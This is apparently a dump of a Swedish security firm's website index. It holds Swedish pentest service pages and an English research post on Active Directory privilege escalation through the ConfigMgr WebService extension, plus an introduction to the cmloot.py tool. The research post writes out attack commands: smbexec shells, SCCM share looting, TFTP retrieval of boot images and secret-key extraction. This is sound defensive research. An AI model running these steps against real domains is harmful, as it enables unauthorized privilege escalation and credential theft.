höjas.\n","date":1699488000,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":1699488000,"objectID":"dc1a4495c97d7cf05a43e26f6e4b99ec","permalink":"https://www.shelltrail.com/sv/cybersakerhetstjanster/internt-natverk-och-active-directory-pentest/","publishdate":"2023-11-09T00:00:00Z","relpermalink":"/sv/cybersakerhetstjanster/internt-natverk-och-active-directory-pentest/","section":"cybersakerhetstjanster","summary":"En intern säkerhetsgranskning av infrastruktur (och Active Directory) omfattar utvärdering av en organisations interna nätverk, system och resurser för att upptäcka sårbarheter och stärka organisationen skydd på djupet från obehörig åtkomst.","tags":["Internt nätverk penetest","Active Directory pentest"],"title":"Internt nätverk/Active Directory pentest","type":"cybersakerhetstjanster"},{"authors":null,"categories":null,"content":"Fler och fler företag väljer att lägga sina tjänster hos publika molnleveratörer. Anledningarna kan vara många men det vanligaste är att det går snabbt att komma igång med, det förenklar skalbarheten och driftsäkerheten.\nDå molnleverantören ofta står för den grundläggande IT-säkerheten så är det upp till administratören att konfigurera och hantera sina molnresurser på ett säkert sätt. Det är i det sistnämnda läget det kan vara värdefullt att utföra en molnsäkerhetsgranskning genom att låta en säkerhetsleverantör som Shelltrail hjälpa till med expertkompetensen.\nHur utförs en molnsäkerhetsgranskning? Det vanligaste utgångsläget för en molnsäkerhetsgranskning är att via ett Read-only eller Security Audit-konto granska resurserna i molnmiljön och verifiera att inga misstag återfinns i infrasrtukturens uppsättning eller konfiguration.\nNågra av de områden som granskas i en molnsäkerhetsgranskning är:\nBehörighetstilldelning Hantering av privilegierade konto Exponerade resurser Bästa praxis Segmentering Kryptering av data Shelltrail\u0026rsquo;s säkerhetstestare har flera års erfarenhet av att granska de större molnlevenratörerna på marknaden och via certifieringar utfärdade av både Amazon AWS och Microsoft Azure har Shelltrail även bevis på kunskap inom domänen.\nOftast brukar en analys av molnmiljön inkluderas vid ett webbapplikationstest när denna är driftsatt i en publik molnmiljö. Anledningen till kombinationen av webb- och molngranskning är att detta ger ett bättre skydd på djupet. Normalt sett tar testet ett par dagar att utföra, men detta är beroende på storeleken av molninfrastrukturen.\nShelltrails vana att arbeta med olika molnleverantörer gör att vi har erfarenhet att utföra test och följa respektive molnleverantörs regler för säkerhetsgranskningar.\nVarför bör moln-miljön testas? Det finns en så kallad Delad Ansvarsmodell hos de olika molnleverantörerna, exempelvis Microsoft Azure samt Amazon AWS. Detta innebär att ansvaret ligger hos administratören för vissa säkerhetsaspekter, beroende på driftsättningstyp (Saas, PaaS, IaaS).\nFler anledningar kan vara: krav från kunder eller leverantörer, kundförtroende och rykte, regulatoriska krav eller verifiering av nuvarande säkerhetsläge.\nVid avslutat uppdrag Vid avslutat uppdrag så sker en avrapportering där Shelltrail\u0026rsquo;s säkerhetsexperter går igenom hela rapporten vilket inkluderar att alla brister presenteras i sin helhet. Rapporten inleds med en högnivå-sammanfattning där betoning av risker prioriteras över tekniska analyser. Inom ett par dagar efter avslutat uppdrag levereras normalt sett rapporten i sitt slutgiltliga format.\n","date":1699488000,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":1699488000,"objectID":"7ded7331da0c1e63a5402a6a0afcfcd0","permalink":"https://www.shelltrail.com/sv/cybersakerhetstjanster/molnsakerhetsgranskning/","publishdate":"2023-11-09T00:00:00Z","relpermalink":"/sv/cybersakerhetstjanster/molnsakerhetsgranskning/","section":"cybersakerhetstjanster","summary":"En säkerhetsgranskning av molninfrastruktur innebär att man utvärderar konfigurationen, åtkomstkontroller, skyddsåtgärder för data och den övergripande säkerheten hos en organisations resurser i molnet för att säkerställa en säketställa molntjänsternas motståndskraft mot angrepp.","tags":["Cloudsäkerhet","Molnsäkerhet"],"title":"Molnsäkerhetsgranskning","type":"cybersakerhetstjanster"},{"authors":null,"categories":null,"content":"En \u0026ldquo;Red Team\u0026rdquo;-övning är ett simulerat angrepp på en organisation, och kan innefatta många olika delar som phishing, social engineering, attacker mot externt exponerad infrastruktur samt interna system. Simuleringen är tänkt att vara så verklighetstrogen som möjligt, där metoder/tekniker, verktyg och tillvägagångssätt emulerar riktiga angripare (ofta baserat på hotbilden mot företagets verksamhetsområde).\nVad är en Red Team-övning En \u0026ldquo;Red Team\u0026rdquo;-övning blandas ofta ihop med det nära besläktade ordet pentest eller penetrationstest, men skiljer sig markant på ett flertal punkter som: utförande, metodik, mål och syfte. Medan ett penetrationstest syftar till att identifiera så många säkerhetsbrister i ett system eller nätverk som möjligt, är en \u0026ldquo;Red Team\u0026rdquo;-övning till för att på ett så realisiskt sett som möjligt testa en hel organisations motståndskraft mot att en angripare kommer åt ett eller flera specifika mål.\nMålen kan vara allt från att komma åt skyddsvärd information, en specifik mailkorg eller att ta över ett känsligt konto. Detta innebär ofta att säkerhetsgranskaren använder andra metoder som på ett mer realistiskt sett simulerar riktiga avancerade angripare.\nUnder en \u0026ldquo;Red Team\u0026rdquo;-övning är även bara en begränsad skara på företaget medvetna om att testet utförs, så att beteendet hos personalen på företaget kan utvärderas och eventuella processer och metoder kan förbättras.\nVarför och när skall vi utföra en Red Team-övning? Vi rekommenderar att en \u0026ldquo;Red Team\u0026rdquo;-övning utförs först när företaghet har genomfört säkerhetsgranskningar av den interna ifrastrukturen och åtgärdat de brister som identifierats. Att få en bra säkerhetsgrund att stå på genom att utföra en intern säkerhetgranskning, där en större bredd av säkerhetbrister identifieras ger ofta mer valuta för pengarna i ett tidigt skede.\nNär företaget känner att miljön håller god säkerhet och processer och verktyg är på plats för att motverka angripare, så kan det vara värt att genomföra ett test för att se att dessa lever upp till den förväntade standarden.\nUtöver dessa tillfällen finns det även regulatoriska krav som kommer ställas på att utföra \u0026ldquo;Red Team\u0026rdquo;-övningar för särskilda branscher, som exempelvis TIBER.\nRapportering och resultat Rapporteringen av resultatet från en \u0026ldquo;Red Team\u0026rdquo;-övning skiljer sig ganska markant från den av ett penetrationstest, då målsättningen och tillvägagångssättet skiljer sig mellan de olika testtyperna. I denna typ av test fokuserar rapporteringen kring en berättelse av den simulerade attacken (eng. Attack Narrative) där testarna resonerar kring vilka attacker som utförts, varför de valdes, när de genomfördes och vilken reaktion det väckte från företagets organisation. Detta görs så att organisationen får en uppfattning om hur en attack riktad mot dem kan se ut från en angripares sida, men även för att kunna identifiera brister, både tekniska och organisatoriska.\n","date":1699488000,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":1699488000,"objectID":"a4713b091471f05065cbdf7960f97692","permalink":"https://www.shelltrail.com/sv/cybersakerhetstjanster/red-team-ovning/","publishdate":"2023-11-09T00:00:00Z","relpermalink":"/sv/cybersakerhetstjanster/red-team-ovning/","section":"cybersakerhetstjanster","summary":"Ett Red Team uppdrag innebär att man simulerar verkliga cyberattacker på en organisation för att testa hela organisationens försvarsförmåga och förbättra den övergripande säkerheten i organisationen.","tags":["Red Team","Motståndar simulering","Attack simulering","OSCE3","OSEP"],"title":"Red Team-övning","type":"cybersakerhetstjanster"},{"authors":null,"categories":null,"content":"Nurförtiden finns hoten överallt och allt från hackers till organiserade brottslingar försöker kontinuerligt angripa företag och deras tillgångar. Ett pentest (kort för penetrationstest) är en specialiserad typ av cybersäkerhetstjänst som strävar efter att hitta sårbarheter i olika typer av applikationer och system. Detta så att man hinner åtgärda sårbarheterna innna de utnyttjas av angripare. Den här artikeln kommer vara en guide för att förklara dessa tester och för att ge förståelse för när det kan vara dags att använda dem för att skydda ert bolags resurser.\nVad är ett pentest? En säkerhetsgranskning benämns ofta som ett pentest eller penetrationstest, och är en process där personer med djup kunskap inom cybersäkerhet gör en bedömning av er säkerhet genom att simulera ett angrepp på utvalda system. Personerna kallas ofta etiska hackare eller pentestare och använder sig av samma metoder och verktyg som en riktig angripare, med syfte att hitta och rapportera säkerhetsbrister. Pentest av externa och även interna tjänster är idag vanligt då många ramverk (som PCI-DSS, ISO 27001), interna policies och kunder ställer krav på eller rekommenderar att genomföra dessa.\nMen det handlar inte bara om att hitta sårbarheter, utan även att stärka skyddet mot en hotbild som bara ökar i takt med digitaliseringen av samhället.\nNär bör ett pentest göras? Att genomföra säkerhetsgranskningar av affärskritiska system bör vara en del av varje företags säkerhetsrutin. Detta då det kan räcka med ett säkerhetshål i något system för att det allvarligt ska påverka den dagliga verksamheten eller företagets rykte negativt.\nFörutom att på en återkommande basis göra granskningar, finns det även några tillfällen då det kan vara bra att genomföra ytterligare tester av säkerhetent:\nOm man är leverantör av en mjukvara eller tjänst och har introducerat ny komplex funktionalitet. Vid upphandlingar eller integrationer av tredjepartssystem. När större systemförändringar genomförs. Generella rekommendationer Vi har även valt att sammanfatta några generella rekommendationer till dig som skall beställa ett test:\nTänk på att inte genomföra tester för sent i ett utvecklings- eller integrationsprojekt. Ofta planeras säkerhetsgranskningar in som ett av de sista delarna innan produktionssättning, utan att reflektera över att dessa tester kan lägga till ytterligare utvecklingsinsatser. Under scoping-fasen är det bra att få en bild av vilka testerare det är som kommer utföra testet, eftersom det inte alltid är samma person som är med och scopar, vilket kan leda till att förväntningarna på pentestet inte matchar resultatet. Vi rekommenderar även att det är minst två testare som samtidigt genomför pentestet då leveransen ofta blir bättre när testarna drar nytta av varandras erfarenheter. Att välja leverantör av penetrationstest Valet av leverantör för att genomföra kan vara svårt om man inte tidigare varit med om processen, och det finns ett antal fallgropar man kan råka ut för. Leverantörerna har alla olika bakgrund, erfarenhet och metodik och det kan därför vara svårt att veta vad som passar just din verksamhet. Vi kommer därför ta upp några punkter som kan var värda att tänka extra på innan ni genomför valet av cybersäkerhetsleverantör.\nIdentifierade sårbarheter Målet med ett pentest är oftast att identifiera så många sårbarheter som möjligt, och framförallt olika typer av sårbarheter. Här kan det variera kraftigt mellan leverantörer som mestadels förlitar sig på automatiserade verktyg och de som förlitar sig på manuell testning. Här är det absolut en fördel att använda sig av manuella tester då de med största sannolikhet hittar de brister som automatiska verktyg inte hittar. Manuell testning kan även uppfatta samband och använda bristerna i en attack-kedja samt möjligheten att hitta brister i affärslogik som automatiserade tester inte kan. Tänk även på att de leverantörer som utför manuella granskningar även använder sig av automatiserade verktyg, vilket gör att du som kund får ut mer av dessa.\nMen även manuella tester kan skilja sig inom och mellan olika leverantörer, då kvalitén är beroende av testarens erfarenhet. För att maximera erfarenheten är det därför oftast bäst att anlita en leverantör som har säkerhet som sitt huvudområde, och inte generell konsultverksamhet, då konsulterna ifråga ofta är delaktiga i andra leveranser och inte har samma fokus på pentestning. Utöver det är det även bra att tillse att pentestarna har tillräcklig erfarenhet, då förmågan att identifiera brister ökar markant med antalet genomförda uppdrag.\nÄven certifieringar inom den typ av system som skall testas (exempelvis OSWE för webb och OSEP för interna nätverk) kan vara en stark indikator på att pentestaren kunnat visa sin förmåga att identifiera mer avancerade sårbarheter.\nRätt allvarlighetsbedömning Att klassificera allvarlighetsgraden för en sårbarhet är inte alltid enkelt, men väldigt viktigt för en mottagare för att kunna göra rätt prioriteringar i arbetet med att säkra upp applikationen/systemet. Det är vanligt att en pentestare med mindre erfarenhet inom området gör en felaktig bedömning av allvarligheten, och därigenom orsakar extra arbete eller att brister som bör prioriteras inte får rätt fokus.\nDet finns även lägen då så kallade \u0026ldquo;false positives\u0026rdquo;, alltså brister som egentligen inte är ett säkerhetsproblem rapporteras. Även här är det viktigt att anlita en erfaren säkerhetsleverantör som tar ett helhetsperspektiv i sin allvarlighetsbedömning så att ni kan göra rätt prioriteringar och därigenom höja säkerhetsnivån.\nTydlig rapportering Värdet av en webbapplikationsgranskning förhöjs genom klar och tydlig kommunikation som ger mottagaren insikt och förståelse för den nuvarande säkerhetsnivån. Det är därför viktigt att en säkerhetsleverantör tydligt kan förklara sårbarheter, vilka risker de kan medföra i just er miljö samt tydligt beskriva hur de kan åtgärdas, både till tekniska men även icke-teckniska mottagare. Här rekommenderar vi att ni efterfrågar en exempelrapport från leverantören för att se om de möter de förväntningar ni ställer.\nSammanfattning Ett pentest är en ovärdelig tillgång i aktiv säkerhetsprocess, där sårbarheter upptäcks och åtgärdas tidigt. Genom att kontinuerligt granska sina applikationer/system/milöjer arbetar ett företag proaktivt och får en bättre motståndskraft mot angrepp. När ni är i processen att säkra era system genom att utföra ett pentest, kom ihåg att det i slutändan är erfarenheten och noggrannheten hos testarna som oftast leder till en värdefull granskning. Vi uppmanar er även att utforska vårat tjänsteutbud för att se om vi kan vara med och hjälpa er att stärka erat skydd och er motsåndskraft.\n","date":1699488000,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":1699488000,"objectID":"9c5eac90181558288fdc4179b28c2dbf","permalink":"https://www.shelltrail.com/sv/blogg/att-tanka-pa-nar-man-bestaller-pentest/","publishdate":"2023-11-09T00:00:00Z","relpermalink":"/sv/blogg/att-tanka-pa-nar-man-bestaller-pentest/","section":"blogg","summary":"När man beställer ett pentest är det många saker man bör tänka på. Den här artikeln går igenom några bra tips på saker att ta i beaktning innan du beställer ett penetrationstest.","tags":["Pentest"],"title":"Vad skall man tänka på när man beställer ett pentest?","type":"blogg"},{"authors":null,"categories":null,"content":"Webbapplikationer i alla dess former är ofta kritiska system för de flesta företag, oavsett om det rör sig om företagets egna exponerade webbsidor, SaaS-lösningar, produkter eller interna system. Webbapplikationer är ofta komplexa lösningar, med mycket funktionalitet och utger därför en stor (ofta internet-exponerad) attackyta. Av dessa anledningar är det viktigt att regelbundet kontrollera säkerheten där ett steg i detta kan vara att göra ett pentest av applikationen.\nVad innebär ett pentest av en webbapplikation? Ett pentest av en webbapplikation innebär att en eller flera erfarna säkerhetsexperter granskar applikationen med samma verktyg och metoder som riktiga angripare använder för att hitta sårbarheter. Dessa sårbarheter kan sedan åtgärdas med hjälp av de pentestarnas rekommendationer, för att stärka skyddet av applikationen.\nSäkerhetsgranskningen utförs inte bara mot brister som nämns i branschstandarder som OWASP Top 10 eller OWASP Testing Guide, utan går även in på logiska brister och brister som är specifika för företagets egen sektor. Här skräddarsys testet efter företagets egna identifierade risker för att bäst försöka minimera dessa.\nVarför och när skall man göra en säkerhetsgranskning? Det finns ett flertal anledningar till att utföra säkerhetsgranskningar av ett företags webbapplikationer, varav några nämns nedan:\nApplikationen är verksamhetskritisk och bör därför skyddas Vid inköp av tredjeparsprodukter, för att verifiera att inga brister existerar Kunder efterfrågar ofta verifikation på att säkerhetsgranskningar har genomförst Regulatoriska krav För de flesta applikationer, som de som är exponerade mot internet eller är kritiska för företagets verksamhet rekommenderas att minst göra årliga säkerhetsgranskningar, eller att utföra dessa då större förändringar gjorts i applikationen\nResultat Vanligtvis tar ett test ca 1-2 veckor att utföra och resulterar i en rapport samt ett avrapporteringsmöte, där alla detaljer kring de påträffade bristerna gås igenom samt hur dessa kan åtgärdas.\nShelltrails säkerhetsexperter har erfarenhet från hundratals säkerhetsgranskningar och har alla branschledande certifieringar inom webbapplikationssäkerhet.\n","date":1699488000,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":1699488000,"objectID":"992897438578f2b7e717fb3c8c49aca1","permalink":"https://www.shelltrail.com/sv/cybersakerhetstjanster/webbapplikations-pentest/","publishdate":"2023-11-09T00:00:00Z","relpermalink":"/sv/cybersakerhetstjanster/webbapplikations-pentest/","section":"cybersakerhetstjanster","summary":"Säkerhetsbedömning av webbapplikationer innebär att utvärdera och identifiera sårbarheter och svagheter inom en webbapplikation för att säkerställa dess skydd mot obehörig åtkomst, databrott och cyberhot.","tags":["Webbsäkerhet bedömning","Webbapplikation säkerhet","OWASP","OSWE"],"title":"Webbapplikations pentest","type":"cybersakerhetstjanster"},{"authors":null,"categories":null,"content":"TL;DR ConfigMgr WebService, a third-party extension used to simplify custom Operating System Deployment (OSD) for Microsoft Configuration Manager adds features to interact with Configuration Manager, MDT and Active Directory which under certain situations can be exploited to escalate privileges in an Active Directory domain. While the extension is considered legacy by the developer, it may still be prevalent in several environments.\nBackground As part of the research surrounding Microsoft Configuration Manager, Shelltrail has investigated a open source third-party tool used in OS deployments which interacts with Configuration Manager, MDT and Active Directory. The tool in question contains two parts, a WebService endpoint called ConfigMgr WebService and a .NET GUI application named ConfigMgr OSD FrontEnd.\nThe tools adds the functionality to create custom Operating System Deployment sequences via ConfigMgr OSD FrontEnd which exposes a GUI during Windows Preinstallation Environment (WinPE) where a user or administrator can customize and define the deployment process by means of using input and checkboxes.\nThe ConfigMgr OSD FrontEnd (OSDFrontEnd.exe) self-service GUI simplifies the customization process as the alternative would be for a Configuration manager administrator to build, and deploy a custom Task Sequence which can be time consuming.\nMost options, configuration and ability to communicate with ConfigMgr WebService for OSDFrontEnd.exe comes from OSDFrontEnd.exe.config which is provided in the OSDFrontEnd enabled WinPE PXE bootable image.\nConfigMgr WebService authentication As unauthenticated access to the ConfigMgr WebService could have severe consequences, a basic authentication mechanism is used, where a secret access key is generated upon installation of the WebService. The access key is generated as an unguessable type-4 UUID and stored in the web.config file in the root of the IIS web application.\nUpon issuing requests to the WebService the WebServiceSecret need to be supplied and if it matches the configured key, the request is authorized. As the ConfigMgr OSD FrontEnd need to know this key in order to make use of the functionality, it is included in the OSDFrontEnd.exe.config file together with the endpoint with which to interact, as seen in the image below.\nBy obtaining the WebServiceSecretKey, communication can be established with the ConfigMgr WebService. From here on different exploitation paths may exist, depending on how the service account is configured for the IIS AppPool running ConfigMgr WebService.\nConfigMgr WebService permissions During the setup of ConfigMgr WebService the service account used in IIS is specified during the Specify Application Pool Identity which can be seen in ConfigMgr WebService 1.8.0 - Installation Guide.pdf from ConfigMgr.WebService.1.8.0.zip.\nThis service account, which this research essentially is all about, is the key to keep the environment secure. If this service account is configured with higher privileges than intended, it may lead to privilege escalations in various ways.\nThe documentation for ConfigMgr WebService regarding the service accounts' permissions can be found in three places\nConfigMgr WebService 1.8.0 - Installation Guide.pdf - page 3 ConfigMgr OSD FrontEnd 1.6.0 - Documentation.pdf - page 35 https://github.com/NickolajA/ConfigMgrWebService As the recommended permissions sometimes contradict each other, and may be quite limited in explanation, administrators may lack proper information when delegating permissions and end up with an overly privileged service account.\nLet\u0026rsquo;s highlight the risks of various permissions.\nExploitation To highlight some of the exploitation paths that can be used with the exposed WebService, we\u0026rsquo;ve set up a test environment and misconfigured the service account used by the WebService in various ways.\nOf course, setting up the service account as a member in Domain Admins is probably the worst scenario where exploitation by WebServices such as AddADUserToGroup or AddADComputerToGroup should be apparent. While rare, configurations such as this are encountered from time to time.\nTo make it a bit more tricky, we\u0026rsquo;ve set up a slightly less obvious configuration where the following setup of Organizational Units (OU) in the Active Directory is used, which is not uncommon.\nWe\u0026rsquo;ve also added the permission of Modify the membership of a group to the service account to the root of the OU CORP, in order for it to be able to make use of some of the exposed WebServices.\nAddADComputerToGroup We will test out the first functionality of ConfigMgr WebService. Namely AddADComputerToGroup\nWhat happened? Local administrator permissions on DEMOMACHINE was given to the computer mylaptop via the custom group Local Administrators - DEMOMACHINE which was located in the OU structure.\n$ smbexec.py test.local/mylaptop\\$@DEMOMACHINE Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra Password: [!] Launching semi-interactive shell - Careful what you execute C:\\Windows\\system32\u0026gt;whoami nt authority\\system C:\\Windows\\system32\u0026gt; Of course this is a fictitious setup however these types of unintended permissions exist in most if not all Active Directory environment.\nThis is caused by unintended inheritance in Active Directory where the administrator gave the ConfigMgr WebService service account Modify the memership of a group to the root if the OU CORP, which included the group Local Administrators - DEMOMACHINE\nTo fix this careful planning of what OU\u0026rsquo;s the service account are allowed to modify is required.\nGetADComputerAttributeValue So let\u0026rsquo;s explore how reading a computer attribute can be exploited to move laterally or escalate privileges. One way would be if Local Administrator Password Solution (LAPS) is misconfigured:\n$ smbexec.py administrator:\u0026#39;Mhr9;3KO5}X%6e\u0026#39;@SRV01 Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra [!] Launching semi-interactive shell - Careful what you execute C:\\Windows\\system32\u0026gt;whoami nt authority\\system C:\\Windows\\system32\u0026gt; AddADUserToGroup But what if LAPS is not misconfigured? Then misconfigure it by adding the service account to the to the fictitious LAPS Password readers-group using the handy AddADUserToGroup command:\nThen fetch ms-mcs-admpwd via GetADComputerAttributeValue\nWould it also be possible to add a user to Domain Admins? Of course, however this requires the service account to have permission in either the domain-root or in the Users container.\nGetADUserAttributeValue Further on it is also possible to enumerate all computers and users with the GetADUserAttributeValue-service by inserting wildcard in LDAP queries.\nWith a full user dump of Active Directory users, password spraying and AS-REP attacks are possible attacks that could be used.\nAnother classic is to enumerate the description field of the Active Directory users, where administrators sometimes put passwords:\nSetADComputerManagedBy The ManagedBy Active Directory attribute should not be confused with the Owner attribute. Being Owner of a Active Directory computer object indirectly means administrator access via the ShadowCredentials attack or Resource Based Constrained Delegation which is not applicable in this case. However ManagedBy have two interesting aspects. If ManagedBy is used on a Active Directory group it is possible to allow the manager to modify membership.\nEven though the LDAP query used to lookup the computer concatenates the user input into the query, basically meaning LDAP injection.\nNo ways of escaping the objectClass=computer was found which means that Active Directory groups cannot be modified with the SetADComputerManagedBy feature.\nThe other interesting aspect is if the ManagedBy attribute is used in conjunction with Read-Only Domain Controllers (RODC).\nThe principal configured in the ManagedBy attribute becomes the local administrator on the RODC.\nuser@adpen1:~$ smbexec.py test.local/test-lowpriv:\u0026#39;Flowahpowah1\u0026#39;@rodc01 Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra [!] Launching semi-interactive shell - Careful what you execute C:\\Windows\\system32\u0026gt;whoami nt authority\\system More recon Until now all attacks originates from having PXE bootable network access with the ability to boot a WinPE configured with ConfigMgr OSD FrontEnd. This limitation can be extended in three ways.\nIn order to include ConfigMgr OSD FrontEnd to a bootable WinPE the source files must be injected to the image. In order for this to work Configuration Manager requires Source directory for the ConfigMgr OSD FrontEnd files to be imported via a UNC path:\nEverybody calm down, I\u0026rsquo;ve got this the administrator says, right-clicks the folder, chooses share and done.\nWhat just happened is a very common issue in Windows corporate environments. As the default permissions on a local folder outside of home folders for example, includes \u0026lt;computername\u0026gt;\\Users with read permissions:\nWhich via nesting includes \u0026lt;domain\u0026gt;\\Domain Users:\nNow every authenticated user in the domain has the permissions to access the secret key in the OSDFrontEnd.exe.config file.\nMore recon #2 OK, so the sources folder in the previous example is now properly secured and no means of obtaining the OSDFrontEnd.exe.config is possible. But wait\u0026hellip;\nWe turn to our nifty tool cmloot.py, to index all files in the SCCM inventory:\nuser@pentest:~$ cmloot.py test.local/test-lowpriv@sccm01 -cmlootinventory sccmfiles.txt Impacket v0.12.0.dev1+20231004.192432.3760dfc6 - Copyright 2023 Fortra [+] Access to SCCMContentLib [+] sccmfiles.txt created user@pentest:~/cmloot$ As the WinPE\u0026rsquo;s are distributed to the Distribution Points running the Configuration Manager PXE service it will be stored in the SCCMContentLib$\nuser@adpen1:~$ cat sccmfiles.txt | grep \u0026#39;\\.wim\u0026#39; \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00002.3\\boot.XYZ00002.wim \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00006.9\\winpe_dotnet.XYZ00006.wim \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00007.3\\winpe.XYZ00007.wim \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ0000C.2\\winpe.XYZ0000C.wim $ cmloot.py test.local/test-lowpriv@sccm01 -n -cmlootdownload sccmfiles.txt -extensions wim Impacket v0.11.0 - Copyright 2023 Fortra [+] Extensions to download [\u0026#39;wim\u0026#39;] [+] Downloaded 7E2C-boot.XYZ00002.wim [+] Downloaded 007F-winpe_dotnet.XYZ00006.wim [+] Downloaded 9599-winpe.XYZ00007.wim [+] Downloaded 4B5C-winpe.XYZ0000C.wim The .wim files can easily be extracted with 7-zip:\nuser@adpen1:~/CMLootOut$ 7z x 007F-winpe_dotnet.XYZ00006.wim 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs Intel(R) Core(TM) i7-8565U CPU @ 1.80GHz (806EC),ASM,AES-NI) Scanning the drive for archives: 1 file, 425193731 bytes (406 MiB) Extracting archive: 007F-winpe_dotnet.XYZ00006.wim [...] After this we just extract the key from the config-file.\nuser@adpen1:~/CMLootOut$ cat sms/PKG/SMS10000/OSDFrontEnd.exe.config | grep SecretKey -A1 \u0026lt;setting name=\u0026#34;WebServiceSecretKey\u0026#34; serializeAs=\u0026#34;String\u0026#34;\u0026gt; \u0026lt;value\u0026gt;134ef495-4991-41df-9fa3-27c1a736de85\u0026lt;/value\u0026gt; More recon #3 OK, so what if the administrator restricts permissions on the SCCMContentLib$ (Actually don\u0026rsquo;t know if this is supported). No problem, you can download the .wim files directly from the Configuration Manager PXE server but only if Configuration i Manager is using WDS for the PXE services.\nAccording to TFTP\u0026rsquo;s RFC you cannot list directories or files which means you need to guess the file names for the .wim files. Luckily, cmloot.py did this for us in the previous example.\nuser@adpen1:~$ cat sccmfiles.txt | grep -i winpe \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00006.9\\winpe_dotnet.XYZ00006.wim \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00007.3\\winpe.XYZ00007.wim user@adpen1:~$ atftp 100.64.5.221 69 -l winpe_dotnet.XYZ00006.wim -g -r \u0026#39;SMSImages\\\\XYZ00006\\\\winpe_dotnet.XYZ00006.wim\u0026#39; user@adpen1:~$ file winpe_dotnet.XYZ00006.wim winpe_dotnet.XYZ00006.wim: Windows imaging (WIM) image v1.13, bootable no. 1, LZX compressed, reparse point fixup If the Configuration Manager PXE use sccmpxe.exe as opposed to WDS PXE this does not work as the WinPE file location is dynamically generated during the PXE process, and does not rely on static paths.\nConclusions and Recommendations As we\u0026rsquo;ve seen in this blog post there are several exploitation paths that could be used by an attacker depending on how the service account is configured. We\u0026rsquo;ve also seen that keeping the WebServiceSecretKey can be a bit of a challenge if the ConfigMgr WebService is in use.\nAs some of the methods to obtaining the WebServiceSecretKey without being authenticated in the Active Directory domain exist these can serve as an initial access vector on a internal network.\nTo limit the exploitation it is recommended to use the principle of least privilege on the service account, ensuring that the minimal permissions possible are given.\nA shortlist of what to avoid can be:\nTo not include the service account in highly privileged groups. To limit the ability for the service account to add users and computers to groups or modify objects other than a limited set of allowed entities. Limit the ability for the usage of SetADComputerManagedBy if RODCs are used in the environment. Note from the developer ConfigMgr WebService last release was back in 2019 and has since stopped developing. The developer is considering the project legacy and recommends not to use it.\n","date":1696896000,"expirydate":-62135596800,"kind":"page","lang":"sv","lastmod":1698766620,"objectID":"f131285c564e6c5540d317cd5a65b241","permalink":"https://www.shelltrail.com/sv/research/microsoft-endpoint-configuration-manager-webservices/","publishdate":"2023-10-10T00:00:00Z","relpermalink":"/sv/research/microsoft-endpoint-configuration-manager-webservices/","section":"research","summary":"New research into an (legacy) extension for Microsoft Endpoint Configuration Manager/SCCM/ConfigMgr reveal new attack paths for Active Directory domain compromise or elevation of privileges.","tags":null,"title":"Microsoft Configuration Manager - New attack paths using ConfigMgr WebService extension","type":"research"},{"authors":null,"categories":null,"content":"TL;DR The newly released cmloot.py tool allows you to do all the stuff you love from CMLoot, but with enhanced capabilities, such as relaying and PtH.. and of course it runs natively on Linux.\nGithub: https://github.com/shelltrail/cmloot\nFollow us on Linkedin for more security related information: https://www.linkedin.com/company/shelltrail\nBackground Configuration Manager is absolutely the new black in terms of security research as many new techniques and attacks have surfaced lately and showed that the complex nature of Configuration Manager may become a security risk for companies. As Configuration Manager runs in most organizations it is well spent time to learn both how to attack and defend this service. As an icing on the cake, Configuration Manager usually contains high privileged accounts or accounts with implicit high privileges, which makes Configuration Manager a lucrative target for attackers (and pentesters).\nConfiguration Manager is a software developed by Microsoft which helps organizations to automatically deploy operating systems and software. Being tightly integrated in Active Directory requires the server to store credentials for various services, some of which have high privileges. Most often the Configuration Manager server will have the ability to install agents on all Windows machines it manages, which requires local administrative privileges on each target. This means that a compromise of Configuration Manager could lead to lateral movement to a multitude of systems.\nBefore diving in to the tooling and the extended features, a bigshout out to Tomas Rzepka who is the inspiration behind this tool with his own CMLoot, which have generated multiple domain compromise paths. Cheers!\nPresenting: cmloot.py Much like Tomas Rzepka\u0026rsquo;s Powershell version, cmloot.py is built to aid penetration testers to search and find sensitive files in Configuration Manager\u0026rsquo;s complex file share structure. cmloot.py is written in python and takes advantage of Impacket\u0026rsquo;s1 SMB protocol implementation which enables all practical features gained from the SMB classes such as pass-the-hash, Kerberos, SOCKS supports and all stunts possible with NTLM-relaying.\nBefore being able to test the possibilities of cmloot.py you need to find a Configuration Manager server or Configuration Manager Distribution Point which shares the SCCMContentLib$ folder. This share is reachable by default with only Domain Users or Domain Computers membership.\nThis share in turn contains three folders, DataLib, FileLib and PkgLib.\nThe shares combined, creates a complex file structure which is optimized and scalable for large Configuration Manager installations with servers deployed world wide.\nThe reason for being complex and in turn scalable is that the DataLib folder only stores .INI-files which contains hash values for the real file. The real file can be found in the FileLib where it is stored in a folder named after the first four characters of the hash value.\nIf you are attempting to search and download multiple files this becomes tedious work. cmloot.py automates this by building an inventory of all files stored in the DataLib share, which is then used as a reference for the files that can be downloaded.\nuser@adpen1:~/cmloot$ python3 cmloot.py test.local/test-lowpriv@sccm01 -cmlootinventory sccmfiles.txt Impacket v0.12.0.dev1+20230907.33311.3f645107 - Copyright 2023 Fortra [+] Access to SCCMContentLib [+] sccmfiles.txt created user@adpen1:~/cmloot$ cat sccmfiles.txt \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00001.1\\amd64\\cmi2migxml.dll \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00001.1\\amd64\\Config_AppsAndSettings.xml \\\\sccm01\\SCCMContentLib$\\DataLib\\XYZ00001.1\\amd64\\Config_AppsOnly.xml 